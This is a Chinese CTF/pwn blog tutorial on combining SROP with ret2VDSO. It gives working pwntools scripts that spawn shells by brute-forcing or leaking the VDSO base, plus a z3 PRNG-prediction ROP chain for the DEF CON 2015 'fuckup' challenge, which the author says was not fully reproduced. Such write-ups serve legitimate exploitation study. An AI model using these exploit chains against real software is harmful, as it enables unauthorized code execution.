---
title: Use SROP with ret2VDSO
date: 2020-03-14 10:24:24
tags: [ctf, pwn]
---

用 SROP 的时候，一般情况下很难找得到 `syscall ; ret`，这时就需要在 VDSO 中找了。

<!-- more -->

# What is VDSO

VDSO（Virtual Dynamically-linked Shared Object）是个很有意思的东西，它是虚拟的，与虚拟内存一样，在计算机中本身并不存在。因为有些系统调用经常被用户使用，这就会出现大量的用户态与内核态切换的开销。VDSO 将内核态的调用映射到用户态的地址空间中，可以大量减少这样的开销，同时也可以使路径更好。

> 这里路径更好指的是，不需要使用传统的 `int 0x80` 来进行系统调用，不同的处理器实现了不同的快速系统调用指令（Intel 实现了 `sysenter`、`sysexit`；AMD 实现了 `syscall`、`sysret`），由此自然就会出现兼容性问题。所以 Linux 实现了 `vsyscall` 接口，在底层会根据具体的结构来进行具体操作。而 `vsyscall` 就实现在 VDSO 中。

Linux（2.6 及以上的版本）环境下执行 `ldd /bin/sh`，会发现有个名字叫 `linux-vdso.so.1`（老点的版本是 `linux-gate.so.1`）的动态文件，而系统中却找不到它，它就是 VDSO。例如：

```bash
$ ldd /bin/sh
	linux-vdso.so.1 =>  (0x00007ffda1746000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a4da29000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f9a4e01b000)
```

不光是快速系统调用，glibc 现在也提供了 VDSO 的支持，`open()`、`read()`、`write()`、`gettimeofday()` 都可以直接用 VDSO 中的实现，使得这些调用更快，glibc 更兼容，内核新特性在不影响 glibc 的情况下也可以更快的部署。

## Why ret2VDSO?

在 x86 系统中，传统的系统调用 `int 0x80` 并没有很好的效果，因此在 Intel 新型的 CPU 提供了新的系统调用指令（2.6 及以上的版本支持新型系统调用机制）：

- `sysenter`
- `sysexit`

VDSO 可以降低在传统的 `int 0x80` 的额外开销以及提供了 `sigreturn` 可以使用 SROP。

其中 vsyscall 固定地址中存在 `syscall ; ret`：

```gdb
assassinq>> x/3i 0xffffffffff600000
   0xffffffffff600000:	mov    rax,0x60
   0xffffffffff600007:	syscall
   0xffffffffff600009:	ret
```

可以写一个程序做一个系统调用的测试：

```cpp
#include <time.h>
#include <stdio.h>

typedef time_t (*time_func)(time_t *);

int main(int argc, char *argv[]) {
    time_t tloc;
    int retval = 0;
    time_func func = (time_func) 0xffffffffff600000;

    retval = func(&tloc);
    if (retval < 0) {
        perror("time_func");
        return -1;
    }
    printf("%ld\n", tloc);
    return 0;
}
```

总而言之，就是在 VDSO 中存在 `syscall ; ret` 可以被 SROP 利用。

## How ret2VDSO?

`sysenter` 其参数传递方式和 `int 0x80` 是一样的，但是需要先做好 Function Prologue：

```asm
push ebp ; mov ebp, esp
```

以及需要找到一个好的 Gadget 来做 Stack Pivot。

## ret2VDSO Theory

获取 VDSO 的方法：

1. 暴力破解
2. 通过泄漏
   - 使用 ld.so 中的 `_libc_stack_end` 找到 stack 其实位置，计算 ELF Auxiliary Vector Offset 并从中取出 `AT_SYSINFO_EHDR`；
   - 使用 ld.so 中的 `_rtld_global_ro` 的某个 Offset 也有 VDSO 的位置。
   - 尤其注意的是在开了 ASLR 的情况下，VDSO 的利用是有一定优势的
     - 在 x86 环境下：只有一个字节是随机的，所以我们可以很容易暴力解决；
     - 在 x64 环境下：在开启了 PIE 的情形下，有 11 字节是随机的，例如：CVE-2014-9585。但是在 Linux 3.182.2 版本之后，这个已经增加到了 18 个字节的随机

查看存储 VDSO 的地址：

```gdb
assassinq>> p &_rtld_global_ro._dl_sysinfo_dso
$1 = (const Elf32_Ehdr **) 0xf7ffced4 <_rtld_global_ro+468>
```

查看 VDSO 的地址（直接 vmmap 也行）：

```gdb
assassinq>> p _rtld_global_ro._dl_sysinfo_dso
$2 = (const Elf32_Ehdr *) 0xf7fd8000
```

通过 ELF Auxiliary Vector Offset 计算出 VDSO 的地址（泄露相应的栈上的值）：

```gdb
assassinq>> info auxv
32   AT_SYSINFO           Special system info/entry points 0xf7fd8b50
33   AT_SYSINFO_EHDR      System-supplied DSO's ELF header 0xf7fd8000 <--- Address of VDSO
16   AT_HWCAP             Machine-dependent CPU capability hints 0x9f8bfbff
6    AT_PAGESZ            System page size               4096
17   AT_CLKTCK            Frequency of times()           100
3    AT_PHDR              Program headers for program    0x8048034
4    AT_PHENT             Size of program header entry   32
5    AT_PHNUM             Number of program headers      9
7    AT_BASE              Base address of interpreter    0xf7fd9000
8    AT_FLAGS             Flags                          0x0
9    AT_ENTRY             Entry point of program         0x8048340
11   AT_UID               Real user ID                   0
12   AT_EUID              Effective user ID              0
13   AT_GID               Real group ID                  0
14   AT_EGID              Effective group ID             0
23   AT_SECURE            Boolean, was exec setuid-like? 0
25   AT_RANDOM            Address of 16 random bytes     0xffffd8cb
31   AT_EXECFN            File name of executable        0xffffdfd8 "/root/tmp/ret2VDSO_Example/main"
15   AT_PLATFORM          String identifying platform    0xffffd8db "i686"
0    AT_NULL              End of vector                  0x0
```

事实证明 VDSO 也没有非常随机，可以做一个测试：

```bash
$ ldd /bin/ls
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007ffff7bb5000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff77eb000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007ffff757b000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7377000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ffff715a000)

$ while true; do ldd /bin/ls; done | grep 0x00007ffff7ffa000
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
    ...
```

# Example

32 位下对 VDSO 进行爆破。程序如下，读入 0x400 的字节，足够塞一个构造的 sigcontext 了：

```cpp
#include <stdio.h>
#include <unistd.h>

char buf[10] = "/bin/sh\x00";

void pwnme() {
    char s[0x100];
	char *welcome = "> ";
    write(1, welcome, 2);
    read(0, s, 0x400);
}

int main() {
	pwnme();
	return 0;
}
```

同时，我们在 VDSO 中可以找到 sigreturn 所对应的调用：

```gdb
assassinq>> x/3i 0xf7fd8b71
   0xf7fd8b71 <__kernel_sigreturn+1>:	mov    eax,0x77
   0xf7fd8b76 <__kernel_sigreturn+6>:	int    0x80
   0xf7fd8b78 <__kernel_sigreturn+8>:	nop
```

关闭 ASLR 对 ret2VDSO 进行测试：

```python
#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['lxterminal', '-e']
context.arch = 'i386'

bin_sh_addr = 0x804a020
bss_addr = 0x804a030

p = process('./main')

#gdb.attach(p)

vdso_addr = 0xf7fd8000
print 'Try vdso %s' % hex(vdso_addr)

payload = 'A' * 0x110
frame = SigreturnFrame(kernel="i386")
frame.eax = constants.SYS_execve
frame.ebx = bin_sh_addr
frame.eip = vdso_addr + 0xb76 # address of int 0x80
frame.esp = bss_addr
frame.ebp = bss_addr
frame.gs = 0x63
frame.cs = 0x23
frame.es = 0x2b
frame.ds = 0x2b
frame.ss = 0x2b
ret_addr = vdso_addr + 0xb71 # address of sigreturn
payload += p32(ret_addr) + str(frame)
p.recvuntil('> ')
p.sendline(payload)

p.sendline('echo pwned')
data = p.recvuntil('pwned')
if data != 'pwned':
    raise Exception, 'Failed'

p.interactive()
```

打开 ASLR 之后对 VDSO 进行爆破（32 位是 $\frac{1}{256}$ 的概率）：

```python
#!/usr/bin/env python
from pwn import *

bin_sh_addr = 0x804a020
bss_addr = 0x804a030
vdso_range = range(0xf7600000, 0xf7700000, 0x1000)

def bruteforce():
    global p
    context.arch = 'i386'
    p = process('./main')
    global vdso_addr
    vdso_addr = random.choice(vdso_range)
    print 'Try vdso %s' % hex(vdso_addr)
    payload = 'A' * 0x110
    frame = SigreturnFrame(kernel="i386")
    frame.eax = constants.SYS_execve
    frame.ebx = bin_sh_addr
    frame.eip = vdso_addr + 0xb76 # address of int 0x80
    frame.esp = bss_addr
    frame.ebp = bss_addr
    frame.gs = 0x63
    frame.cs = 0x23
    frame.es = 0x2b
    frame.ds = 0x2b
    frame.ss = 0x2b
    ret_addr = vdso_addr + 0xb71 # address of sigreturn
    payload += p32(ret_addr) + str(frame)
    p.recvuntil('> ')
    p.send(payload)
    p.sendline('echo pwned')
    data = p.recvuntil('pwned')
    if data != 'pwned':
        info('Failed')
    return

if __name__ == '__main__':
    global p, vdso_addr
    i = 1
    while True:
        print 'Try %d' % i
        try:
            bruteforce()
        except Exception as e:
            info('Wrong VDSO')
            p.close()
            i += 1
            continue
        info('vdso_addr = ' + hex(vdso_addr))
        break
    p.interactive()
```

# Example_x64

64 位下使用 AXUV 泄漏 VDSO 的例子。主要是输入一串长为 1024 的字符串：

```nasm
section .text

global _start
jmp _start
vuln:
sub rsp, 8
mov rax, 0 ; sys_read
xor rdi, rdi
mov rsi, rsp
mov rdx, 1024
syscall
add rsp, 8
ret

_start:
call vuln
mov rax, 60 ; sys_exit
xor rdi, rdi
syscall

gadgets:
mov rdi, 1
ret
mov rax, 15
ret
syscall
ret
```

尝试利用 vsyscall 中的 `syscall ; ret` 没能成功，所以在程序后面又加了一个 Gadget 用来构造（具体什么原因没有找到）。在栈上泄漏 AUXV 之后，可以获取 VDSO 的基址以及输入的字符串在栈上的地址。脚本如下：

```python
#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
#context.terminal = ['lxterminal', '-e']

p = process('./main')

# id's of Auxillary Vectors
AT_SYSINFO_EHDR = 0x21
AT_HWCAP = 0x10
AT_PAGESZ = 0x06
AT_CLKTCK = 0x11
AT_PHDR = 0x03
AT_PHENT = 0x04
AT_PHNUM = 0x05
AT_BASE = 0x07
AT_FLAGS = 0x08
AT_ENTRY = 0x09
AT_UID = 0x0b
AT_EUID = 0x0c
AT_GID = 0x0d
AT_EGID = 0x0e
AT_SECURE = 0x17
AT_RANDOM = 0x19
AT_EXECFN = 0x1f
AT_PLATFORM = 0x0f

gdb.attach(p)

vuln_addr = 0x400082
set_write = 0x4000ac
syscall_addr = 0x400096
set_sigreturn = 0x4000b2

payload = '/bin/sh\x00'
payload += p64(vuln_addr)
payload += p64(set_write)
payload += p64(syscall_addr)
payload += 'A' * 8
payload += p64(vuln_addr)
raw_input('@')
p.send(payload)

payload = 'A'
raw_input('@')
p.send(payload)
ENV_AUX_VEC = p.recv(1024)
QWORD_LIST = []
for i in range(0, len(ENV_AUX_VEC), 8):
    QWORD_LIST.append(u64(ENV_AUX_VEC[i:i + 8]))
start_aux_vec = QWORD_LIST.index(AT_SYSINFO_EHDR) # 计算AUXV的起始地址
info(hex(start_aux_vec))
AUX_VEC_ENTRIES = QWORD_LIST[start_aux_vec: start_aux_vec + (18 * 2)] # size of auxillary table
AUX_VEC_ENTRIES = dict(AUX_VEC_ENTRIES[i:i + 2] for i in range(0, len(AUX_VEC_ENTRIES), 2))
vdso_addr = AUX_VEC_ENTRIES[AT_SYSINFO_EHDR]
info("vdso_addr = " + hex(vdso_addr))
bin_sh_addr = AUX_VEC_ENTRIES[AT_RANDOM] - 0x379 # 获取“/bin/sh”地址
info("bin_sh_addr = " + hex(bin_sh_addr))

syscall_ret = 0xffffffffff600007
syscall_ret = 0x4000b8

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rip = syscall_addr
payload = 'A' * 8 + p64(set_sigreturn) + p64(syscall_ret) + str(frame)
raw_input('@')
p.send(payload)

p.interactive()
```

# fuckup

2015 Defcon Quals 中这道题可以使用 ret2VDSO 和 SROP。具体没能复现出来，主要理解一下思想。

```bash
$ checksec ./fuckup
[*] '/home/beale/Desktop/2015-Defcon-Quals-fuckup/fuckup'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

总共有五个选项，选项 2 会修改程序段和栈的基址，并重新指向新的地址；选项 3 会告诉我们当前的随机数并再次随机化程序段；选项 4 中可以进行溢出：

```bash
$ ./fuckup
Welcome to Fully Unguessable Convoluted Kinetogenic Userspace Pseudoransomization, the new and improved ASLR.
This app is to help prove the benefits of F.U.C.K.U.P.
Main Menu
---------
1. Display info
2. Change random
3. View state info
4. Test stack smash
-------
0. Quit
```

在选项 2 的代码反编译后可以看到，每次用户执行命令时，程序会根据类似于 WELL512 的生成算法生成的随机数，改变二进制映射的存储器的基址：

```cpp
int sub_80481A6()
{
  ...
  do
  {
    seed_1 = WELL512() * 4294967295.0;
    seed_2 = (signed __int64)seed_1;
    addy = (void *)(seed_2 & 0xFFFFF000);
    actual = my_mmap(seed_2 & 0xFFFFF000, 28672, 3, 34, -1, 0, v0, v0);
  }
  while ( (seed_2 & 0xFFFFF000) != actual );
  qmemcpy(addy, dword_804EB40, 0x7000u);
  my_mprotect(addy, 0x4000u, 5);
  ...
}
```

普通的思路肯定是做不了的。使用 VDSO 的思路大致如下：

- 因为 32 位下 VDSO 只有 1 字节是随机的，可以暴力破解
- 直接溢出改返回地址，但只有 100 个字节
  - 首先先利用 VDSO 的 Gadget 做出 sys_read 并加大输入的大小
  - 将读入的内容放到 TLS（TLS 的位置在 VDSO 前一页）
  - 使用 sysenter 将栈转移到 TLS 段
  - 在第二次输入的时候将 /bin/sh 放到 TLS 段（这个时候栈已经搬到 TLS 了）
- 接着把 Sigreturn Gadget 以及 Fake Signal Frame 一并放进，然后可以直接 execve 执行 /bin/sh
- 循环直到成功 get shell

还可以通过 z3 对伪随机数进行预测，脚本如下：

```python
#!/usr/bin/env python
from pwn import *
from z3 import *
import time

context.log_level = 'debug'
context.arch = 'i386'
state = [BitVec("a1_{0}".format(i), 32) for i in range(16)]

def m(x):
    return p32(x + offset)

def well512(index):
    idx = (index+15) & 15
    a = state[index]
    c = state[(index+13) & 15]
    b = a ^ c ^ ((a << 16) & 0xffffffff) ^ ((c << 15) & 0xffffffff)
    c = state[(index+9) & 15]
    c ^= (c >> 11)
    state[(index+10) & 15] = c ^ b
    a = state[idx]
    d = ((32 * (c ^ b)) & 0xDA442D24) ^ c ^ b
    state[idx] = a ^ b ^ d ^ ((a << 2) & 0xffffffff) ^ (
        (b << 18) & 0xffffffff) ^ ((c << 28) & 0xffffffff)
    return idx

def well512_z3(index):
    idx = (index+15) & 15
    a = state[index]
    c = state[(index+13) & 15]
    b = a ^ c ^ (a << 16) ^ (c << 15)
    c = state[(index+9) & 15]
    c ^= LShR(c, 11)
    a = state[idx]
    state[(index+10) & 15] = b ^ c
    d = ((32 * (c ^ b)) & 0xDA442D24) ^ c ^ b
    a = state[idx]
    state[idx] = a ^ b ^ d ^ (a << 2) ^ (b << 18) ^ (c << 28)
    return idx

def find_state(recv):
    info('Start find state.')
    global state
    z = Solver()
    idx = 15
    for r in recv:
        idx = well512_z3(idx)
        z.add(state[idx] == r + 1)
    return z

p = process('./fuckup')

def choice(c):
    p.recvuntil('Quit\n')
    p.sendline(str(c))

r_list = []
for i in range(15):
    choice(3)
    sleep(0.1)
    r = int(p.recv(0x20)[0x11:0x19], 16)
    r_list.append(r)
info(r_list)
z = find_state(r_list)
info('Solver result => ' + str(z.check()))
next_state = dict()
model = z.model()
for i in model:
    idx = int(str(i)[3:])
    val = model[i].as_long()
    next_state[idx] = val
info(next_state)
for i in range(16):
    if i in next_state:
        state[i] = next_state[i]
idx = 15
for i in range(15):
    idx = well512(idx)
idx = well512(idx)
predict_val = state[idx] - 1
info('predict_val = ' + hex(predict_val))
current_base = 0xfffff000 & predict_val
info('current_base = ' + hex(current_base))

base = 0x8048000
offset = current_base - base
# 0x0804908f : pop eax ; pop ebx ; pop esi ; ret
pop_eax_ebx_esi_ret = 0x0804908f
# 0x0804961a : pop edx ; pop ecx ; pop ebx ; ret
pop_edx_ecx_ebx_ret = 0x0804961a
# 0x0804875f : int 0x80
int_0x80 = 0x0804875f

payload = 'A' * 0x16
payload += m(pop_eax_ebx_esi_ret)
payload += p32(0x7D)
payload += p32(0)
payload += p32(0)
payload += m(pop_edx_ecx_ebx_ret)
payload += p32(0x7)
payload += p32(0x1000)
payload += p32(current_base)
payload += m(int_0x80)
payload += m(pop_eax_ebx_esi_ret)
payload += p32(0x3)
payload += p32(0)
payload += p32(0)
payload += m(pop_edx_ecx_ebx_ret)
payload += p32(0x100)
payload += p32(current_base)
payload += p32(0)
payload += m(int_0x80)
payload += p32(current_base)
payload = payload.ljust(100, 'A')
payload += asm(shellcraft.sh())
p.sendline('4')
p.sendline(payload)
p.interactive()
```

# References

https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2vdso
http://adam8157.info/blog/2011/10/linux-vdso/
https://bestwing.me/stack-overflow-three-SROP.html
https://www.anquanke.com/post/id/85810
https://binlep.github.io/2020/03/03/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%20--%20Advanced%20ROP/
https://www.voidsecurity.in/2014/12/return-to-vdso-using-elf-auxiliary.html
https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/
https://pwnexpoit.tistory.com/13
